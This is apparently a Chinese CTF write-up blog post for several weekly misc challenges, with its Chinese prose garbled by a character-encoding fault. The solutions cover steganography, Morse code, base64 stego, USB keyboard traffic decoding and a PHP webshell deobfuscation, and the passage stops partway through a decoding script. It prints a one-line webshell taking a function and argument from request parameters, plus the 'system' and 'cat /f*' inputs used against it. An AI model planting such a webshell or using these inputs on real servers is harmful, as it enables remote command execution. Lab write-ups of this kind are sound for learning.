<h3 id="å‹ç¼©åŒ…ä»¬"><a href="#å‹ç¼©åŒ…ä»¬" class="headerlink" title="å‹ç¼©åŒ…ä»¬"></a>å‹ç¼©åŒ…ä»¬</h3><p>ç¬¬ä¸€æ­¥ï¼Œä¿®å¤å‹ç¼©åŒ…ï¼Œè¡¥å›æ–‡ä»¶å¤´<code>50 4B 03 04</code><br>ç”¨bandzipç»§ç»­æ‰“å¼€ï¼Œå‘ç°æ˜¯æŸåçš„ï¼Œä½†å…¶ä»–è½¯ä»¶æ˜¾ç¤ºåŠ å¯†äº†ï¼ŒåŒæ—¶æœ‰ä¸€æ®µbase64å­—ç¬¦ï¼Œè§£å¯†æç¤ºæˆ‘ä»¬6ä½æ•°å­—å¯†ç ï¼Œç›´æ¥çˆ†ç ´<br>æŠ½è±¡ï¼Œæ‰“ä¸å¼€ï¼Œbinwalkä¹‹åçš„ä¹Ÿæ‰“ä¸å¼€ï¼Œé‚£å°±æ‹¿æœ€å¼€å§‹çš„é™„ä»¶å»binwalkä¸€ä¸‹ï¼Œè™½ç„¶è¿˜æ˜¯æé†’æ–‡ä»¶æŸåï¼Œä½†æ‰“å¼€äº†</p>
<p>emmmï¼Œå¥½åƒæˆ‘ç”µè„‘çš„å‹ç¼©åŒ…è½¯ä»¶æœ‰ä¸€ç‚¹é—®é¢˜ï¼Œä¸»ç”¨çš„bandzipä¸è¡Œçš„æ—¶å€™ï¼Œå°±å¾—æ¢å¦ä¸€ä¸ªè¯•è¯•ï¼Œå°±å¾ˆçƒ¦</p>
<h3 id="ç©ºç™½æ ¼"><a href="#ç©ºç™½æ ¼" class="headerlink" title="ç©ºç™½æ ¼"></a>ç©ºç™½æ ¼</h3><p>ç¬¬ä¸€å‘¨ç»“æŸçš„æ—¶å€™ï¼Œå®˜æ–¹wpçš„æ˜¯<code>WhiteSpaceè¯­è¨€ï¼šhttps://vii5ard.github.io/whitespace/</code><br>æˆ‘å»å¹´9æœˆä»½æ‰“çš„æ—¶å€™ï¼Œæˆ‘æ˜¯ç”¨wordæ‰“å¼€å‘ç°ï¼Œåªæœ‰tabè·Ÿç©ºæ ¼ï¼Œç„¶åæƒ³åˆ°äºŒè¿›åˆ¶ï¼Œè½¬æ¢01ï¼Œç„¶åæœ‰äº›ç»†èŠ‚ä¸è®°å¾—äº†ï¼Œåæ­£å½“æ—¶å°±è¿™æ ·æ‰“å‡ºæ¥äº†</p>
<h3 id="éšç§˜çš„çœ¼ç›"><a href="#éšç§˜çš„çœ¼ç›" class="headerlink" title="éšç§˜çš„çœ¼ç›"></a>éšç§˜çš„çœ¼ç›</h3><p>çœ¼ç›ï¼Ÿé‚£è‚¯å®š<code>SilentEye</code></p>
<h2 id="week2-2"><a href="#week2-2" class="headerlink" title="week2"></a>week2</h2><h3 id="æ–°å»ºWordæ–‡æ¡£"><a href="#æ–°å»ºWordæ–‡æ¡£" class="headerlink" title="æ–°å»ºWordæ–‡æ¡£"></a>æ–°å»ºWordæ–‡æ¡£</h3><p>wordæ˜¯ç©ºç™½çš„ï¼Œç›´æ¥binwalkä¸€ä¸‹(å…¶å®å¯ä»¥åœ¨Wordé‡Œé¢é€šè¿‡æŸç§æ–¹å¼æ‰¾åˆ°çš„ï¼Œä½†æˆ‘ä¹ æƒ¯binwalk)ï¼Œ<code>æ–°å»ºWordæ–‡æ¡£.docx.extracted\word\document.xml</code>ï¼Œæ‰¾åˆ°æ–°ä½›æ›°ï¼Œæ‰¾ä¸ªå·¥å…·æˆ–ç½‘ç«™ï¼Œå·¥å…·ç”¨çš„<code>ToolsFx</code><br><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a><br>å®˜æ–¹è§£é‡Šæ˜¯ï¼ŒWPSæ¸…é™¤æ ¼å¼ï¼Œè¿™ä¸ªç¡®å®å¯ä»¥<br>Wordè¦æŸ¥çœ‹éšè—å­—ä½“ï¼Œç„¶åæˆ‘çš„Wordæ‰“å¼€å°±æ˜¯äº†ï¼Ÿ</p>
<h3 id="æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢"><a href="#æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢" class="headerlink" title="æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢"></a>æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢</h3><p>æ‹–å…¥<code>Audacity</code>ï¼Œä¸€çœ¼æ‘©æ–¯å¯†ç <br><code>..-. .-.. .- --. - .... . -... . ... - -.-. . ..-. . .-. .. ... -.-- --- ..-</code></p>
<h3 id="1-åºç« "><a href="#1-åºç« " class="headerlink" title="1-åºç« "></a>1-åºç« </h3><p>sqlæ³¨å…¥ï¼Œå‘ç°æ¯æ¬¡æ³¨å…¥çš„å¼€å¤´ASCIIéƒ½æ˜¯40ï¼Œç»“å°¾ä¸åŒï¼Œå› ä¸ºçˆ†ç ´æˆåŠŸäº†ï¼Œæ‰€ä»¥ç»“å°¾æ˜¯flagçš„ASCIIï¼ŒæŠŠå®ƒä»¬æå‡ºæ¥<br><code>121 111 117 95 119 52 110 116 95 115 51 99 114 101 116 102 108 97 103 123 106 117 115 116 95 119 52 114 109 95 117 112 95 115 48 95 121 111 117 95 110 51 101 100 95 104 52 114 100 101 114 95 54 48 50 54 99 100 51 50 125 44</code><br>è„šæœ¬ï¼Ÿä¸å¤ªä¼šå†™(åº”è¯¥ç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè¿‡æ»¤æå–)ï¼Œå·¥ä½œé‡è¿˜å¥½ï¼ŒäººåŠ›å°šèƒ½åº”å¯¹QWQ</p>
<h3 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h3><p>base64ï¼Ÿä¸å¯¹ï¼Œbase64éšå†™</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;base.txt&quot;</span>)  <span class="comment"># æ–‡ä»¶åœ°å€</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmpbin = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():  <span class="comment"># æŒ‰ç…§è¡Œæ¥è¯»å–æ–‡æœ¬</span></span><br><span class="line">    line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (line[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>):  <span class="comment"># å½“ç¬¬ä¸€ä½æ˜¯â€˜=â€™æ—¶</span></span><br><span class="line">        <span class="keyword">if</span> (line[-<span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>):  <span class="comment"># å½“ç¬¬äºŒä½æ˜¯â€˜=â€™æ—¶</span></span><br><span class="line">            i = table.index(line[-<span class="number">3</span>])  <span class="comment"># è¿”å›å€’æ•°ç¬¬ä¸‰ä½çš„å­—ç¬¦åœ¨å­—å…¸ä¸­çš„ä½ç½®</span></span><br><span class="line">            b = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]  <span class="comment"># äºŒè¿›åˆ¶åŒ–åå»æ‰obå‰ç¼€</span></span><br><span class="line">            b = b.zfill(<span class="number">6</span>)  <span class="comment"># å°†äºŒè¿›åˆ¶æ•°å¡«å……ä¸º6ä½</span></span><br><span class="line">            tmpbin += b[-<span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = table.index(line[-<span class="number">2</span>])  <span class="comment"># è¿”å›å€’æ•°ç¬¬äºŒä½çš„å­—ç¬¦</span></span><br><span class="line">            b = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            b = b.zfill(<span class="number">6</span>)</span><br><span class="line">            tmpbin += b[-<span class="number">2</span>:]</span><br><span class="line">length = <span class="built_in">len</span>(tmpbin) / <span class="number">8</span>  <span class="comment"># è®¡ç®—æ•°æ®ç»„æ•°</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(length)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>], <span class="number">2</span>))  <span class="comment"># å¯¹äºŒè¿›åˆ¶æ•°base64ç¼–ç å¤„ç†</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>èµ›åšå¨å­è§£å‡ºæ¥æ˜¯base58</p>
<h3 id="WebShellçš„åˆ©ç”¨"><a href="#WebShellçš„åˆ©ç”¨" class="headerlink" title="WebShellçš„åˆ©ç”¨"></a>WebShellçš„åˆ©ç”¨</h3><p>ç‰›é­”ï¼Œå¥—å¨ƒé¢˜ã€‚ã€‚ã€‚<br><code>eval(str_rot13(convert_uudecode(str_rot13(base64_decode()))));</code>å¾ªç¯ä¸Šäº†æ˜¯å§ï¼Œè¿™è„šæœ¬æš‚æ—¶è¿˜çœŸä¸ä¼šå†™ï¼Œå¥—ä¸ªå®˜æ–¹è„šæœ¬ï¼Œå¥½åƒå¾ªç¯äº†10æ¬¡å§ï¼Œè¦è§£ç 40ä¸‹ï¼ŒçœŸè¦æ‰‹å·¥çš„è¯ï¼Œå¥½åƒä¹Ÿèƒ½æ¥å—(bushi)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;&#x27;)))));&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">50</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64/&quot;</span>, <span class="variable">$shell</span>)) &#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/eval/&quot;</span>, <span class="string">&quot;return&quot;</span>, <span class="variable">$shell</span>);</span><br><span class="line">        <span class="variable">$shell</span> = <span class="keyword">eval</span>(<span class="variable">$temp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$shell</span>;</span><br></pre></td></tr></table></figure>
<p><code>error_reporting(0);($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;]);</code></p>
<p>ä¼ <code>system</code>å’Œ<code>cat /f*</code>å³å¯</p>
<h3 id="Jvav"><a href="#Jvav" class="headerlink" title="Jvav"></a>Jvav</h3><p>Javaç›²æ°´å°ï¼Œç”¨ä¸€èˆ¬çš„ç›²æ°´å°å·¥å…·ä¹Ÿçœ‹å¾—è§ï¼Œä½†æ˜¯è¶…çº§æ¨¡ç³Šã€‚ã€‚ã€‚è¿˜æ˜¯å¤ªæäº†<br>ç›´æ¥ä¸ŠJavaç›²æ°´å°å·¥å…·<br><a target="_blank" rel="noopener" href="https://github.com/ww23/BlindWatermark">https://github.com/ww23/BlindWatermark</a><br><img src="https://pic1.zhimg.com/80/v2-31da2ed6da66c750713f87f23bad658c_1440w.png" alt=""></p>
<h2 id="week3-2"><a href="#week3-2" class="headerlink" title="week3"></a>week3</h2><h3 id="é˜³å…‰å¼€æœ—å¤§ç”·å­©"><a href="#é˜³å…‰å¼€æœ—å¤§ç”·å­©" class="headerlink" title="é˜³å…‰å¼€æœ—å¤§ç”·å­©"></a>é˜³å…‰å¼€æœ—å¤§ç”·å­©</h3><p>é¦–å…ˆï¼Œç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼Œéå¸¸é˜³å…‰ï¼<br><a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/#">https://aghorler.github.io/emoji-aes/#</a></p>
<h3 id="å¤§æ€¨ç§"><a href="#å¤§æ€¨ç§" class="headerlink" title="å¤§æ€¨ç§"></a>å¤§æ€¨ç§</h3><p>ä¸€å¼ GIFï¼Œä½†æ˜¯ä¸åŠ¨çš„ï¼Ÿ<br><code>Stegsolve-&gt;Frame Browser-&gt;ç¬¬äºŒå¸§-&gt;æ±‰ä¿¡ç </code>ï¼Œç”¨ä¸­å›½ç¼–ç è¿™ä¸ªè½¯ä»¶<br>ç½‘ç«™<a target="_blank" rel="noopener" href="https://tuzim.net/hxdecode/">https://tuzim.net/hxdecode/</a></p>
<p>å®˜æ–¹çš„é€å¸§æå–è„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_frames</span>(<span class="params">gif_path, output_dir</span>):</span><br><span class="line">    gif = Image.<span class="built_in">open</span>(gif_path)</span><br><span class="line">    os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            current_frame = gif.tell()</span><br><span class="line">            output_path = os.path.join(output_dir, <span class="string">f&quot;frame_<span class="subst">&#123;current_frame&#125;</span>.png&quot;</span>)</span><br><span class="line">            gif.save(output_path, <span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">            gif.seek(current_frame + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æå–å®Œæˆï¼&quot;</span>)</span><br><span class="line">gif_path = <span class="string">&quot;1.gif&quot;</span></span><br><span class="line">output_dir = <span class="string">&quot;./res/&quot;</span></span><br><span class="line">extract_frames(gif_path, output_dir)</span><br></pre></td></tr></table></figure>
<h3 id="2-åˆ†æ"><a href="#2-åˆ†æ" class="headerlink" title="2-åˆ†æ"></a>2-åˆ†æ</h3><p>è¦æ‰¾åˆ°ï¼Œæ”»å‡»è€…ç™»å½•ä½¿ç”¨çš„ç”¨æˆ·åï¼Œå­˜åœ¨æ¼æ´çš„æ–‡ä»¶åï¼ŒWebShellæ–‡ä»¶å<br>ç™»å½•ä¸€èˆ¬æ˜¯postè¯·æ±‚ï¼Œè¿‡æ»¤<code>http &amp;&amp; http.request.method == POST</code><br><code>login.php</code>ï¼Œæ‹¿åˆ°ç”¨æˆ·å<code>best_admin</code>ï¼Œè¿™ä¸ªå¯¼å‡ºhttpå¯¹è±¡ç¿»ç¿»ä¹Ÿå¾ˆå®¹æ˜“æ‰¾åˆ°ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æœ<code>username</code>ï¼Œè¿™ä¸ªä¹ŸæŒºå¿«çš„</p>
<p>æ¼æ´åˆ©ç”¨å¸¸ç”¨åˆ°<code>systemå‡½æ•°</code>ï¼Œç›´æ¥æœï¼Œä¹Ÿèƒ½æ‰¾åˆ°<br><img src="https://pic1.zhimg.com/80/v2-49469ce9a6f3f251f4110362f3b565e4_1440w.png" alt=""><br>æ‰€ä»¥å¾—åˆ°ï¼Œ<code>best_admin_index.php_wh1t3g0d.php</code></p>
<p>ä¹Ÿå¯ä»¥å‚è€ƒå®˜æ–¹ï¼Œ<code>http &amp;&amp; http.response.code != 404</code>ï¼Œè¿‡æ»¤æ‰å“åº”çŠ¶æ€ç ä¸º404çš„å“åº”ï¼Œè¿›è¡Œåˆ†æ</p>
<h3 id="é”®ç›˜ä¾ "><a href="#é”®ç›˜ä¾ " class="headerlink" title="é”®ç›˜ä¾ "></a>é”®ç›˜ä¾ </h3><p><code>USBæµé‡æŒ‡çš„æ˜¯USBè®¾å¤‡æ¥å£çš„æµé‡ï¼Œæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç›‘å¬usbæ¥å£æµé‡è·å–é”®ç›˜æ•²å‡»é”®ã€é¼ æ ‡ç§»åŠ¨ä¸ç‚¹å‡»ã€å­˜å‚¨è®¾å¤‡çš„é“­æ–‡ä¼ è¾“é€šä¿¡ã€USBæ— çº¿ç½‘å¡ç½‘ç»œä¼ è¾“å†…å®¹ç­‰ç­‰ã€‚åœ¨CTFä¸­ï¼ŒUSBæµé‡åˆ†æä¸»è¦ä»¥é”®ç›˜å’Œé¼ æ ‡æµé‡ä¸ºä¸»ã€‚</code><br>å…ˆå­¦ä¹ ä¸€ä¸‹ï¼Œ<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/107723635">https://blog.csdn.net/qq_43625917/article/details/107723635</a></p>
<p>å‘ç°é”®ç›˜æµé‡ï¼Œè¿‡æ»¤ä¸€ä¸‹ï¼Œ<code>usb.src==&quot;1.15.1&quot;</code><br>ç„¶åå…¨éƒ¨å¯¼å‡ºï¼Œæ“ä½œä¸º<code>æ–‡ä»¶-&gt;å¯¼å‡ºç‰¹å®šåˆ†ç»„</code>ï¼Œä¿å­˜ä¸º<code>usb.pcapng</code><br>ä½¿ç”¨tsharkå‘½ä»¤å¯¹æµé‡æ•°æ®è¿›è¡Œæå–å¹¶å»é™¤ç©ºè¡Œ<br><code>tshark -r usb.pcapng -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code>(Linuxæ‰§è¡Œ)ï¼Œæå‡ºæ¥çš„æ•°æ®æ˜¯ä¸å¸¦å†’å·çš„</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">             <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;usbdata.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>] == <span 